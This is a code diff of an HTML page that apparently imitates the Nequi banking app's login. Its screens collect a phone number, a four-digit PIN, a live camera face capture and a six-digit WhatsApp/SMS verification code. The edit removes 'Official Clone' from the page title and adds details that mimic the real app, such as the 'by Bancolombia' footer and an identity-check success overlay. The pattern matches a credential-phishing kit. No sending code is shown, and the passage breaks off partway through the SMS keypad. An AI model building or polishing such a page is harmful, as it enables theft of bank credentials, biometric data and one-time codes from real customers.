@@ -3,24 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Nequi App - Official Clone</title>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <title>Nequi</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
     <style>
         :root {
             --magenta: #e6007e;
             --dark-purple: #21002d;
             --input-bg: #3b2144;
-            --error-red: #ff4d6d;
             --text-gray: #b5a4ba;
-            --dot-bg: #ede7f6;
+            --dot-bg: rgba(255,255,255,0.18);
             --white: #ffffff;
             --success-cyan: #4dd0e1;
-            --overlay-black: rgba(0, 0, 0, 0.7);
         }
 
         * {
-            margin: 0;
-            padding: 0;
+            margin: 0; padding: 0;
             box-sizing: border-box;
             font-family: 'Inter', sans-serif;
             user-select: none;
@@ -33,8 +30,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
-            width: 100vw;
+            height: 100vh; width: 100vw;
             overflow: hidden;
             position: fixed;
         }
@@ -50,35 +46,10 @@
             background-color: var(--dark-purple);
         }
 
-        .key:active { background: rgba(255,255,255,0.1); }
-        .delete-icon { width: 30px; stroke-width: 2.5; }
-
-        .btn-olvide-container {
-            display: flex;
-            justify-content: center;
-            padding-bottom: 10px;
-        }
-
-        .btn-olvide {
-            background: transparent;
-            border: 1px solid rgba(255,255,255,0.2);
-            color: white;
-            padding: 8px 25px;
-            border-radius: 10px;
-            font-size: 14px;
-            font-weight: 600;
-            cursor: pointer;
-        }
-
-        .hidden { display: none !important; }
-        .flex { display: flex !important; }
-
-        /* --- TOAST DE ERROR --- */
+        /* ===================== ERROR TOAST ===================== */
         #error-toast {
             position: absolute;
-            top: 20px;
-            left: 20px;
-            right: 20px;
+            top: 20px; left: 20px; right: 20px;
             background-color: #ff5271;
             padding: 16px;
             border-radius: 12px;
@@ -89,21 +60,19 @@
             box-shadow: 0 10px 30px rgba(0,0,0,0.5);
             animation: slideInDown 0.4s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
-
         @keyframes slideInDown {
             from { transform: translateY(-150%); }
-            to { transform: translateY(0); }
+            to   { transform: translateY(0); }
         }
-
         #error-toast svg { width: 24px; height: 24px; color: white; }
         #error-toast p { font-size: 13.5px; line-height: 1.4; font-weight: 500; color: white; }
 
-        /* --- PANTALLA 1: LOGIN --- */
+        /* ===================== PANTALLA 1: LOGIN ===================== */
         #screen-login {
             display: flex;
             flex-direction: column;
             height: 100%;
-            padding: 20px;
+            padding: 20px 20px 0 20px;
         }
 
         .header-ayuda {
@@ -113,8 +82,8 @@
         }
 
         .btn-ayuda {
-            background: rgba(255, 255, 255, 0.08);
-            border: 1px solid rgba(255, 255, 255, 0.3);
+            background: rgba(255,255,255,0.08);
+            border: 1px solid rgba(255,255,255,0.3);
             color: white;
             padding: 8px 18px;
             border-radius: 20px;
@@ -132,11 +101,11 @@
             flex-direction: column;
             justify-content: space-between;
             align-items: center;
-            padding: 60px 0 20px 0;
+            padding: 40px 0 16px 0;
         }
 
         .logo-img {
-            width: 180px;
+            width: 190px;
             filter: drop-shadow(0 0 10px rgba(230,0,126,0.2));
         }
 
@@ -144,8 +113,7 @@
             width: 100%;
             display: flex;
             flex-direction: column;
-            gap: 15px;
-            padding-bottom: 20px;
+            gap: 12px;
         }
 
         .input-group {
@@ -154,45 +122,110 @@
             border-radius: 14px;
             display: flex;
             align-items: center;
-            padding: 18px;
+            padding: 17px 18px;
             border: 1.5px solid transparent;
-            transition: all 0.3s;
+            transition: all 0.25s;
         }
-
+        .input-group.error {
+            border-color: #ff5271;
+        }
 
         .input-group span {
             color: var(--text-gray);
-            padding-right: 15px;
+            padding-right: 14px;
             border-right: 1.5px solid #5d4264;
             font-size: 16px;
             font-weight: 600;
+            white-space: nowrap;
         }
 
         .input-group input {
             background: transparent;
             border: none;
             color: white;
-            padding-left: 15px;
-            font-size: 18px;
+            padding-left: 14px;
+            font-size: 17px;
             width: 100%;
             outline: none;
-            letter-spacing: 1px;
+            letter-spacing: 0.5px;
+        }
+        .input-group input::placeholder { color: rgba(255,255,255,0.4); }
+
+        /* error text below input */
+        #phone-error-text {
+            font-size: 12.5px;
+            color: #ff7a8a;
+            margin-top: -4px;
+            padding-left: 4px;
+            display: none;
         }
 
+        /* Entra button */
         .btn-entra {
             width: 100%;
             background-color: var(--magenta);
             color: white;
             border: none;
-            padding: 18px;
+            padding: 17px;
             border-radius: 14px;
             font-size: 18px;
             font-weight: 700;
             cursor: pointer;
-            box-shadow: 0 4px 15px rgba(230, 0, 126, 0.3);
+            box-shadow: 0 4px 15px rgba(230,0,126,0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 58px;
+            transition: background 0.2s;
+        }
+        .btn-entra:active { background-color: #c9006e; }
+
+        /* Spinner inside Entra button */
+        .btn-spinner {
+            display: none;
+            width: 24px; height: 24px;
+            border: 3px solid rgba(255,255,255,0.35);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: btnSpin 0.7s linear infinite;
+        }
+        @keyframes btnSpin { 100% { transform: rotate(360deg); } }
+
+        /* Login footer "Comprobar un pago" */
+        .login-footer {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 14px 0 18px 0;
+            border-top: 1px solid rgba(255,255,255,0.08);
+            margin-top: 8px;
+        }
+        .login-footer-left {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            color: rgba(255,255,255,0.65);
+            font-size: 13.5px;
+            font-weight: 500;
+        }
+        .login-footer-left svg { width: 18px; height: 18px; }
+        .login-footer-right {
+            display: flex;
+            align-items: center;
+            gap: 6px;
+            color: rgba(255,255,255,0.4);
+            font-size: 12px;
+        }
+        /* Efecty logo placeholder */
+        .efecty-logo {
+            width: 24px; height: 24px;
+            background: #f5a623;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+            font-size: 11px; font-weight: 800; color: white;
         }
 
-        /* --- PANTALLA 2: CLAVE (PIN) --- */
+        /* ===================== PANTALLA 2: PIN ===================== */
         #screen-pin {
             display: none;
             flex-direction: column;
@@ -204,60 +237,91 @@
             background: none;
             border: none;
             color: white;
-            font-size: 32px;
-            width: 40px;
-            margin: 10px 0;
             cursor: pointer;
+            padding: 8px 0;
+            display: flex;
+            align-items: center;
         }
+        .btn-back svg { width: 24px; height: 24px; stroke: white; }
 
         .pin-header {
             font-size: 26px;
             font-weight: 700;
-            margin-bottom: 20px;
+            margin: 12px 0 22px;
         }
 
         .pin-dots-container {
             display: flex;
             justify-content: center;
-            gap: 15px;
-            margin-bottom: 15px;
+            gap: 14px;
+            margin-bottom: 12px;
         }
 
         .pin-dot {
-            width: 50px;
-            height: 50px;
-            background-color: var(--dot-bg);
+            width: 52px; height: 52px;
+            background-color: white;
             border-radius: 12px;
+            border: 1.5px solid rgba(255,255,255,0.25);
             display: flex;
             align-items: center;
             justify-content: center;
-            color: #da0081;
-            font-size: 28px;
-            font-weight: 800;
+            color: var(--magenta);
+            font-size: 30px;
+            font-weight: 900;
+            transition: all 0.15s;
+        }
+        .pin-dot.filled {
+            background-color: white;
+            border-color: white;
+        }
+
+        .pin-subtitle {
+            text-align: center;
+            font-size: 14px;
+            color: rgba(255,255,255,0.5);
+            line-height: 1.5;
+            margin-bottom: 8px;
         }
 
         .keypad {
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            gap: 5px;
+            gap: 4px;
             margin-top: auto;
-            margin-bottom: 10px;
+            margin-bottom: 8px;
         }
 
         .key {
-            height: 65px;
+            height: 68px;
             display: flex;
             align-items: center;
             justify-content: center;
             font-size: 32px;
-            font-weight: 500;
+            font-weight: 400;
             cursor: pointer;
             border-radius: 12px;
+            transition: background 0.1s;
+        }
+        .key:active { background: rgba(255,255,255,0.1); }
+        .delete-icon { width: 28px; stroke-width: 2; }
+
+        .btn-olvide-container {
+            display: flex;
+            justify-content: center;
+            padding-bottom: 16px;
+        }
+        .btn-olvide {
+            background: transparent;
+            border: 1px solid rgba(255,255,255,0.2);
+            color: rgba(255,255,255,0.75);
+            padding: 9px 28px;
+            border-radius: 10px;
+            font-size: 14px;
+            font-weight: 600;
+            cursor: pointer;
         }
 
-        .key:active { background: rgba(255,255,255,0.1); }
-
-        /* --- PANTALLA 3: CARGANDO --- */
+        /* ===================== PANTALLA 3: LOADING ===================== */
         #screen-loading {
             display: none;
             flex-direction: column;
@@ -266,78 +330,99 @@
             height: 100%;
             width: 100%;
             position: absolute;
-            top: 0;
-            left: 0;
+            top: 0; left: 0;
             z-index: 10000;
             background-color: white;
         }
-
-        /* Canvas de la animación */
         #loading-canvas {
-            width: 100px;
-            height: 100px;
+            width: 100px; height: 100px;
             display: block;
         }
-
         .loading-text {
-            margin-top: 40px;
-            font-size: 12px;
+            margin-top: 36px;
+            font-size: 11px;
             font-weight: 700;
-            letter-spacing: 2.5px;
-            color: #4a4a4a;
+            letter-spacing: 2px;
+            color: #9e9e9e;
             text-transform: uppercase;
+            min-height: 16px;
         }
 
-        /* --- PANTALLA 4: SELECCIÓN IDENTIDAD --- */
+        /* ===================== PANTALLA 4: IDENTIDAD ===================== */
         #screen-identity-choice {
             display: none;
             flex-direction: column;
             height: 100%;
             background-color: white;
-            padding: 20px;
+            padding: 16px 20px;
+            position: relative;
         }
 
         .id-header {
             color: #21002d;
             font-size: 24px;
             font-weight: 700;
-            margin-top: 20px;
-            margin-bottom: 30px;
+            margin-top: 16px;
+            margin-bottom: 24px;
         }
 
         .choice-card {
             background: white;
-            border-radius: 12px;
-            padding: 20px;
+            border-radius: 14px;
+            padding: 18px 20px;
             display: flex;
             align-items: center;
-            gap: 15px;
-            box-shadow: 0 4px 15px rgba(0,0,0,0.08);
+            gap: 14px;
+            box-shadow: 0 2px 12px rgba(0,0,0,0.07);
             cursor: pointer;
-            border: 1px solid #f0f0f0;
+            border: 1px solid #ebebeb;
         }
-
         .choice-card .icon-circle {
-            width: 45px;
-            height: 45px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: #4a4a4a;
+            width: 40px; height: 40px;
+            display: flex; align-items: center; justify-content: center;
+            color: #555;
         }
-
         .choice-card .text-info h4 {
             color: #21002d;
-            font-size: 16px;
+            font-size: 15px;
             font-weight: 600;
         }
-
         .choice-card .text-info p {
-            color: #757575;
-            font-size: 13px;
+            color: #888;
+            font-size: 12.5px;
+            margin-top: 1px;
         }
 
-        /* --- PANTALLA 5: RECONOCIMIENTO FACIAL --- */
+        /* SUCCESS OVERLAY — aparece sobre la pantalla de identidad */
+        #success-overlay {
+            display: none;
+            position: absolute;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
+            background: rgba(255,255,255,0.15);
+            justify-content: center;
+            align-items: center;
+            z-index: 50;
+        }
+        .success-box {
+            width: 150px; height: 150px;
+            background-color: var(--success-cyan);
+            border-radius: 24px;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            gap: 8px;
+            animation: popIn 0.45s cubic-bezier(0.175, 0.885, 0.32, 1.275) both;
+        }
+        @keyframes popIn {
+            from { transform: scale(0.4); opacity: 0; }
+            to   { transform: scale(1);   opacity: 1; }
+        }
+        .success-box svg { width: 55px; height: 55px; color: white; }
+        .success-box span { color: white; font-weight: 700; font-size: 17px; }
+
+        /* ===================== PANTALLA 5: CÁMARA ===================== */
         #screen-facial-capture {
             display: none;
             flex-direction: column;
@@ -348,12 +433,32 @@
             overflow: hidden;
         }
 
+        /* Top nav bar de la cámara */
+        .camera-top-nav {
+            position: absolute;
+            top: 0; left: 0; right: 0;
+            z-index: 5;
+            display: flex;
+            align-items: center;
+            padding: 14px 16px;
+            gap: 12px;
+        }
+        .camera-top-nav .btn-back-cam {
+            background: none; border: none;
+            cursor: pointer;
+            display: flex; align-items: center;
+        }
+        .camera-top-nav .btn-back-cam svg { stroke: white; width: 22px; height: 22px; }
+        .camera-top-nav .cam-title {
+            color: white;
+            font-size: 16px;
+            font-weight: 600;
+        }
+
         #video-feed {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             object-fit: cover;
             transform: scaleX(-1);
             z-index: 1;
@@ -361,307 +466,375 @@
 
         .camera-overlay {
             position: absolute;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
+            top: 0; left: 0;
+            width: 100%; height: 100%;
             display: flex;
             flex-direction: column;
             align-items: center;
             z-index: 2;
-            background: radial-gradient(circle at center, transparent 30%, rgba(0,0,0,0.4) 70%);
         }
 
-        .oval-mask {
-            margin-top: 80px;
-            width: 280px;
-            height: 380px;
-            border: 4px solid rgba(255, 255, 255, 0.6);
-            border-radius: 50%;
-            box-shadow: 0 0 0 9999px rgba(0, 0, 0, 0.4);
-        }
-
+        /* Instrucción debajo del nav */
         .instruction-banner {
             background-color: #ff5271;
             color: white;
-            width: 80%;
-            padding: 18px;
+            width: 86%;
+            padding: 14px 18px;
             border-radius: 12px;
             text-align: center;
-            margin-top: 40px;
-            font-size: 16px;
+            margin-top: 70px;
+            font-size: 15px;
             font-weight: 600;
+            line-height: 1.4;
             box-shadow: 0 4px 15px rgba(0,0,0,0.3);
         }
 
-        /* --- PANTALLA 6: LISTO (SUCCESS) --- */
-        #screen-ready {
-            display: none;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100%;
-            background-color: white;
+        /* Máscara oval centrada */
+        .oval-mask {
+            margin-top: 30px;
+            width: 260px; height: 360px;
+            border: 3px solid rgba(255,255,255,0.55);
+            border-radius: 50%;
+            box-shadow: 0 0 0 9999px rgba(0,0,0,0.42);
         }
 
-        .success-box {
-            width: 160px;
-            height: 160px;
-            background-color: var(--success-cyan);
-            border-radius: 25px;
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            gap: 10px;
-            animation: popIn 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275);
-        }
-
-        @keyframes popIn {
-            from { transform: scale(0.5); opacity: 0; }
-            to { transform: scale(1); opacity: 1; }
-        }
-
-        .success-box svg { width: 60px; height: 60px; color: white; }
-        .success-box span { color: white; font-weight: 700; font-size: 18px; }
-
-        /* --- PANTALLA 7: SMS --- */
+        /* ===================== PANTALLA 7: SMS ===================== */
         #screen-sms {
             display: none;
             flex-direction: column;
             height: 100%;
-            padding: 20px 25px;
+            padding: 16px 22px;
             background-color: white;
         }
 
-        #screen-sms .pin-header { color: #21002d; }
+        .sms-back-btn {
+            background: none; border: none;
+            cursor: pointer;
+            padding: 8px 0;
+            display: flex; align-items: center;
+        }
+        .sms-back-btn svg { stroke: #21002d; width: 22px; height: 22px; }
 
-        .pin-message {
-            text-align: center;
-            font-size: 15px;
-            color: var(--text-gray);
-            line-height: 1.5;
-            margin-bottom: 20px;
-            font-weight: 500;
+        .sms-title {
+            color: #21002d;
+            font-size: 24px;
+            font-weight: 700;
+            margin: 14px 0 18px;
         }
 
         .sms-input-grid {
             display: grid;
             grid-template-columns: repeat(6, 1fr);
-            gap: 8px;
-            margin-bottom: 30px;
+            gap: 7px;
+            margin-bottom: 18px;
         }
 
         .sms-box {
-            height: 65px;
-            background: #f4f2f7;
-            border-radius: 12px;
+            height: 48px;
+            background: #f0eef4;
+            border-radius: 10px;
             display: flex;
             align-items: center;
             justify-content: center;
-            font-size: 24px;
+            font-size: 22px;
             font-weight: 700;
             color: #21002d;
         }
 
-        .whatsapp-info {
+        .sms-body-text {
+            text-align: center;
+            font-size: 14px;
+            color: #888;
+            line-height: 1.55;
+            margin-bottom: 18px;
+        }
+
+        .sms-resend-row {
             display: flex;
             align-items: center;
             gap: 12px;
-            margin-bottom: 25px;
+            margin-bottom: 16px;
         }
 
+        /* spinner magenta */
         .circle-progress {
-            width: 40px;
-            height: 40px;
-            border: 4px solid #f0f0f0;
-            border-top: 4px solid var(--magenta);
+            width: 32px; height: 32px;
+            border: 3.5px solid rgba(230,0,126,0.2);
+            border-top-color: var(--magenta);
             border-radius: 50%;
-            animation: spin 2s linear infinite;
+            flex-shrink: 0;
+            animation: spinAnim 1.5s linear infinite;
+        }
+        @keyframes spinAnim { 100% { transform: rotate(360deg); } }
+
+        .sms-resend-text {
+            font-size: 13.5px;
+            color: #555;
         }
 
-        @keyframes spin { 100% { transform: rotate(360deg); } }
-
+        /* Botón "Pídelo aquí" — magenta */
         .btn-pidelo {
             width: 100%;
             background: transparent;
-            border: 1px solid #d1cbd3;
-            color: #d1cbd3;
-            padding: 12px;
+            border: 1.5px solid var(--magenta);
+            color: var(--magenta);
+            padding: 11px;
             border-radius: 10px;
             font-weight: 600;
             font-size: 14px;
+            cursor: pointer;
+            margin-bottom: 4px;
         }
 
+        /* Keypad SMS — números grandes oscuros */
         .sms-keypad {
             margin-top: auto;
             display: grid;
             grid-template-columns: repeat(3, 1fr);
-            padding-bottom: 10px;
+            gap: 2px;
+            padding-bottom: 8px;
         }
 
         .sms-key {
-            height: 60px;
+            height: 64px;
             display: flex;
             align-items: center;
             justify-content: center;
             color: #21002d;
-            font-size: 28px;
+            font-size: 30px;
             font-weight: 400;
+            cursor: pointer;
+            border-radius: 10px;
+            transition: background 0.1s;
         }
+        .sms-key:active { background: rgba(33,0,45,0.06); }
+        .sms-delete-btn {
+            background: #21002d;
+            border-radius: 8px;
+            width: 44px; height: 34px;
+            display: flex; align-items: center; justify-content: center;
+            margin: auto;
+        }
+        .sms-delete-btn svg { stroke: white; width: 18px; height: 18px; }
 
-        .bg-white { background-color: white !important; }
-        .bg-purple { background-color: var(--dark-purple) !important; }
+        /* ===================== UTILIDADES ===================== */
+        .btn-back-dark {
+            background: none; border: none;
+            color: #21002d; font-size: 28px;
+            cursor: pointer;
+            padding: 6px 0;
+            line-height: 1;
+        }
     </style>
 </head>
 <body>
+<div class="app-container">
 
-    <div class="app-container">
-        
-        <div id="error-toast">
-            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><line x1="12" y1="8" x2="12" y2="12"></line><line x1="12" y1="16" x2="12.01" y2="16"></line></svg>
-            <p id="error-message">¡Ups! Esa no es tu clave.</p>
+    <!-- TOAST ERROR GLOBAL -->
+    <div id="error-toast">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+            <circle cx="12" cy="12" r="10"/><line x1="12" y1="8" x2="12" y2="12"/><line x1="12" y1="16" x2="12.01" y2="16"/>
+        </svg>
+        <p id="error-message">¡Ups! Esa no es tu clave.</p>
+    </div>
+
+    <!-- ========== PANTALLA 1: LOGIN ========== -->
+    <div id="screen-login">
+        <div class="header-ayuda">
+            <button class="btn-ayuda">
+                <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
+                    <circle cx="12" cy="12" r="10"/>
+                    <path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"/>
+                    <line x1="12" y1="17" x2="12.01" y2="17"/>
+                </svg>
+                Ayuda
+            </button>
         </div>
 
-        <!-- PANTALLA 1: LOGIN -->
-        <div id="screen-login">
-            <div class="header-ayuda">
-                <button class="btn-ayuda">
-                    <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"></circle><path d="M9.09 9a3 3 0 0 1 5.83 1c0 2-3 3-3 3"></path><line x1="12" y1="17" x2="12.01" y2="17"></line></svg>
-                    Ayuda
+        <div class="main-login">
+            <div class="logo-container">
+                <img src="https://comunidad.nequi.co/wp-content/uploads/2023/06/logo-blanco-nequi.png" class="logo-img" alt="Nequi">
+            </div>
+            <div class="form-bottom">
+                <div class="input-group" id="phone-input-group">
+                    <span>+57</span>
+                    <input type="tel" id="phone-field" placeholder="Número de celular" maxlength="13">
+                </div>
+                <p id="phone-error-text">Escribe por fa el número de tu cel para seguir.</p>
+                <button class="btn-entra" id="btn-entra" onclick="goToPin()">
+                    <span id="btn-entra-text">Entra</span>
+                    <div class="btn-spinner" id="btn-spinner"></div>
                 </button>
             </div>
-            <div class="main-login">
-                <div class="logo-container">
-                    <img src="https://comunidad.nequi.co/wp-content/uploads/2023/06/logo-blanco-nequi.png" class="logo-img" alt="Nequi">
-                </div>
-                <div class="form-bottom">
-                    <div class="input-group">
-                        <span>+57</span>
-                        <input type="tel" id="phone-field" placeholder="Número de celular" maxlength="12">
-                    </div>
-                    <button class="btn-entra" onclick="goToPin()">Entra</button>
-                </div>
+        </div>
+
+        <!-- Footer "Comprobar un pago" -->
+        <div class="login-footer">
+            <div class="login-footer-left">
+                <!-- Diamond / kite icon -->
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round">
+                    <polygon points="12 2 22 12 12 22 2 12"/>
+                </svg>
+                Comprobar un pago
+            </div>
+            <div class="login-footer-right">
+                <span>by Bancolombia</span>
+            </div>
+        </div>
+    </div>
+
+    <!-- ========== PANTALLA 2: PIN ========== -->
+    <div id="screen-pin">
+        <button class="btn-back" onclick="showScreen('screen-login')">
+            <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                <path d="M19 12H5M12 5l-7 7 7 7"/>
+            </svg>
+        </button>
+
+        <h2 class="pin-header">Escribe tu clave</h2>
+
+        <div class="pin-dots-container">
+            <div class="pin-dot" id="dot0"></div>
+            <div class="pin-dot" id="dot1"></div>
+            <div class="pin-dot" id="dot2"></div>
+            <div class="pin-dot" id="dot3"></div>
+        </div>
+
+        <p class="pin-subtitle">
+            No dudamos que seas tú...<br>
+            Pero es mejor confirmar ;)
+        </p>
+
+        <div class="keypad">
+            <div class="key" onclick="pressPin('1')">1</div>
+            <div class="key" onclick="pressPin('2')">2</div>
+            <div class="key" onclick="pressPin('3')">3</div>
+            <div class="key" onclick="pressPin('4')">4</div>
+            <div class="key" onclick="pressPin('5')">5</div>
+            <div class="key" onclick="pressPin('6')">6</div>
+            <div class="key" onclick="pressPin('7')">7</div>
+            <div class="key" onclick="pressPin('8')">8</div>
+            <div class="key" onclick="pressPin('9')">9</div>
+            <div></div>
+            <div class="key" onclick="pressPin('0')">0</div>
+            <div class="key" onclick="delPin()">
+                <svg class="delete-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"/>
+                    <line x1="18" y1="9" x2="12" y2="15"/>
+                    <line x1="12" y1="9" x2="18" y2="15"/>
+                </svg>
             </div>
         </div>
 
-        <!-- PANTALLA 2: PIN -->
-        <div id="screen-pin">
-            <button class="btn-back" onclick="showScreen('screen-login')">←</button>
-            <h2 class="pin-header">Escribe tu clave</h2>
-            <div class="pin-dots-container">
-                <div class="pin-dot" id="dot0"></div>
-                <div class="pin-dot" id="dot1"></div>
-                <div class="pin-dot" id="dot2"></div>
-                <div class="pin-dot" id="dot3"></div>
+        <div class="btn-olvide-container">
+            <button class="btn-olvide">Olvidé mi clave</button>
+        </div>
+    </div>
+
+    <!-- ========== PANTALLA 3: LOADING ========== -->
+    <div id="screen-loading">
+        <canvas id="loading-canvas"></canvas>
+        <p class="loading-text" id="loading-label"></p>
+    </div>
+
+    <!-- ========== PANTALLA 4: IDENTIDAD ========== -->
+    <div id="screen-identity-choice">
+        <h2 class="id-header">Validemos tu identidad</h2>
+        <div class="choice-card" onclick="startFacial()">
+            <div class="icon-circle">
+                <!-- Face scan icon -->
+                <svg width="30" height="30" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M4 7V5a2 2 0 0 1 2-2h2"/>
+                    <path d="M16 3h2a2 2 0 0 1 2 2v2"/>
+                    <path d="M20 17v2a2 2 0 0 1-2 2h-2"/>
+                    <path d="M8 21H6a2 2 0 0 1-2-2v-2"/>
+                    <circle cx="12" cy="10" r="3"/>
+                    <path d="M7 18.5c.9-2.3 3-3.5 5-3.5s4.1 1.2 5 3.5"/>
+                </svg>
             </div>
-            <p class="pin-message">
-                No dudamos que seas tú...<br>
-                Pero es mejor confirmar ;)
-            </p>
-            <div class="keypad">
-                <div class="key" onclick="pressPin('1')">1</div>
-                <div class="key" onclick="pressPin('2')">2</div>
-                <div class="key" onclick="pressPin('3')">3</div>
-                <div class="key" onclick="pressPin('4')">4</div>
-                <div class="key" onclick="pressPin('5')">5</div>
-                <div class="key" onclick="pressPin('6')">6</div>
-                <div class="key" onclick="pressPin('7')">7</div>
-                <div class="key" onclick="pressPin('8')">8</div>
-                <div class="key" onclick="pressPin('9')">9</div>
-                <div class="key-empty"></div>
-                <div class="key" onclick="pressPin('0')">0</div>
-                <div class="key" onclick="delPin()">
-                    <svg class="delete-icon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
-                        <path d="M21 4H8l-7 8 7 8h13a2 2 0 0 0 2-2V6a2 2 0 0 0-2-2z"></path>
-                        <line x1="18" y1="9" x2="12" y2="15"></line>
-                        <line x1="12" y1="9" x2="18" y2="15"></line>
-                    </svg>
-                </div>
-            </div>
-            <div class="btn-olvide-container">
-                <button class="btn-olvide">Olvidé mi clave</button>
+            <div class="text-info">
+                <h4>Reconocimiento facial</h4>
+                <p>Más seguridad</p>
             </div>
         </div>
 
-        <!-- PANTALLA 3: CARGANDO (con animación canvas perfeccionada) -->
-        <div id="screen-loading">
-            <canvas id="loading-canvas"></canvas>
-            <p class="loading-text" id="loading-label">UN MOMENTO...</p>
-        </div>
-
-        <!-- PANTALLA 4: SELECCIÓN IDENTIDAD -->
-        <div id="screen-identity-choice">
-            <button class="btn-back" style="color: #21002d;" onclick="showScreen('screen-pin')">←</button>
-            <h2 class="id-header">Validemos tu identidad</h2>
-            <div class="choice-card" onclick="startFacial()">
-                <div class="icon-circle">
-                    <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 8h.01M9 8h.01M11 14h2M12 2a10 10 0 1 0 10 10A10 10 0 0 0 12 2z"/></svg>
-                </div>
-                <div class="text-info">
-                    <h4>Reconocimiento facial</h4>
-                    <p>Más seguridad</p>
-                </div>
-            </div>
-        </div>
-
-        <!-- PANTALLA 5: CÁMARA FACIAL -->
-        <div id="screen-facial-capture">
-            <video id="video-feed" autoplay playsinline></video>
-            <div class="camera-overlay">
-                <div class="instruction-banner">
-                    Mira de frente <br> a la cámara por favor
-                </div>
-                <div class="oval-mask"></div>
-                <div style="margin-top: auto; padding-bottom: 40px;">
-                    <svg width="60" height="60" viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="1.5">
-                        <path d="M12 22c5.523 0 10-4.477 10-10S17.523 2 12 2 2 6.477 2 12s4.477 10 10 10z"/>
-                        <path d="M12 16v-4M12 8h.01"/>
-                    </svg>
-                </div>
-            </div>
-        </div>
-
-        <!-- PANTALLA 6: LISTO -->
-        <div id="screen-ready">
+        <!-- ¡LISTO! overlay — aparece sobre esta pantalla como en el video -->
+        <div id="success-overlay">
             <div class="success-box">
-                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"></polyline></svg>
+                <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <polyline points="20 6 9 17 4 12"/>
+                </svg>
                 <span>¡Listo!</span>
             </div>
         </div>
+    </div>
 
-        <!-- PANTALLA 7: SMS -->
-        <div id="screen-sms">
-            <button class="btn-back" style="color: #21002d;" onclick="showScreen('screen-ready')">←</button>
-            <h2 class="id-header" style="margin-bottom: 10px;">Ingresa el código</h2>
-            <div class="sms-input-grid">
-                <div class="sms-box" id="s0"></div>
-                <div class="sms-box" id="s1"></div>
-                <div class="sms-box" id="s2"></div>
-                <div class="sms-box" id="s3"></div>
-                <div class="sms-box" id="s4"></div>
-                <div class="sms-box" id="s5"></div>
+    <!-- ========== PANTALLA 5: CÁMARA FACIAL ========== -->
+    <div id="screen-facial-capture">
+        <video id="video-feed" autoplay playsinline muted></video>
+
+        <!-- Top nav: "← Tu foto" -->
+        <div class="camera-top-nav">
+            <button class="btn-back-cam" onclick="stopCameraAndGoBack()">
+                <svg viewBox="0 0 24 24" fill="none" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M19 12H5M12 5l-7 7 7 7"/>
+                </svg>
+            </button>
+            <span class="cam-title">Tu foto</span>
+        </div>
+
+        <div class="camera-overlay">
+            <!-- Instrucción en banner rosa -->
+            <div class="instruction-banner" id="instruction-banner">
+                Mira de frente<br>a la cámara por favor
             </div>
-            <p class="pin-message">Escribe los 6 números que te enviamos por WhatsApp. Si no te llegó, revisa tus mensajes de texto.</p>
-            <div class="whatsapp-info">
-                <div class="circle-progress"></div>
-                <span style="color: #757575; font-size: 14px;">¿No te llegó? ¡Pídelo otra vez!</span>
-            </div>
-            <button class="btn-pidelo">Pídelo aquí</button>
-            <div class="sms-keypad">
-                <div class="sms-key" onclick="pressSms('1')">1</div>
-                <div class="sms-key" onclick="pressSms('2')">2</div>
-                <div class="sms-key" onclick="pressSms('3')">3</div>
-                <div class="sms-key" onclick="pressSms('4')">4</div>
-                <div class="sms-key" onclick="pressSms('5')">5</div>
